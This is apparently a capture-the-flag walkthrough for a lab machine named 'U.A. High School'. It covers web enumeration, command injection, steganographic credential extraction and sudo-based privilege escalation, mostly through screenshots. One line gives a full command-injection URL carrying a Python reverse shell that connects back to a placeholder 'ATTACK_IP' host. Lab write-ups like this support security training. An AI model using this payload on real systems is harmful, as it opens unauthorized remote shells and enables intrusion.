# U.A. High School

![Welcome.png](UA_high_resources/Welcome.png)

![creators.png](UA_high_resources/creators.png)


![machine_ip.png](UA_high_resources/machine_ip.png)
## Enumeration

Check out webpage:

![homepage.png](UA_high_resources/homepage.png)


Nmap Results:

![Temp/UA_High_School/UA_high_resources/nmap.png](UA_high_resources/nmap.png)

Gobuster Results:

![Temp/UA_High_School/UA_high_resources/gobuster.png](UA_high_resources/gobuster.png)

Ffuf Results:

![Temp/UA_High_School/UA_high_resources/ffuf.png](UA_high_resources/ffuf.png)

Nikto Results:

![nikto.png](UA_high_resources/nikto.png)

## Point of Entry


![Temp/UA_High_School/UA_high_resources/BurpSuite.png](UA_high_resources/BurpSuite.png)

Command Injection:

![index_php.png](UA_high_resources/index_php.png)

Get python reverse shell from https://www.revshells.com

![revhells.png](UA_high_resources/revhells.png)


![php_cmd.png](UA_high_resources/php_cmd.png)

```
http://MACHINE_IP/assets/index.php?cmd=python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACK_IP",4445));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
```

Start a listener on attack machine:

![Temp/UA_High_School/UA_high_resources/listener.png](UA_high_resources/listener.png)

Use command injection in web browser and await connection:

![nc_connection.png](UA_high_resources/nc_connection.png)

Find images:

![assets_images.png](UA_high_resources/assets_images.png)

## Interactive Shell

![interactive_shell.png](UA_high_resources/interactive_shell.png)

Download Images:

![wget_images.png](UA_high_resources/wget_images.png)

Examine files:

![file_info.png](UA_high_resources/file_info.png)


![hexeditor.png](UA_high_resources/hexeditor.png)


Use wiki's list of file signatures to change data type to match jpg magic numbers:

https://en.wikipedia.org/wiki/List_of_file_signatures


![magic_numbers_corrected.png](UA_high_resources/magic_numbers_corrected.png)

Resulting Image:

![deku_jpg.png](UA_high_resources/deku_jpg.png)


Extract creds:

![steghide.png](UA_high_resources/steghide.png)


Repeated the process with yuei.jpg - no useful reults

![file_yuei.png](UA_high_resources/file_yuei.png)

## Hidden Content

Find passphrase in "Hidden_Content"

![passphrasetxt.png](UA_high_resources/passphrasetxt.png)


## User info

![user.txt.png](UA_high_resources/user.txt.png)

## Privesc

`sudo -l` results:

![sudo-l.png](UA_high_resources/sudo-l.png)

Change /etc/sudoers with feedback.sh and gain root shell:

![privesc_root.png](UA_high_resources/privesc_root.png)

Complete!


# References

https://www.revshells.com

https://en.wikipedia.org/wiki/List_of_file_signatures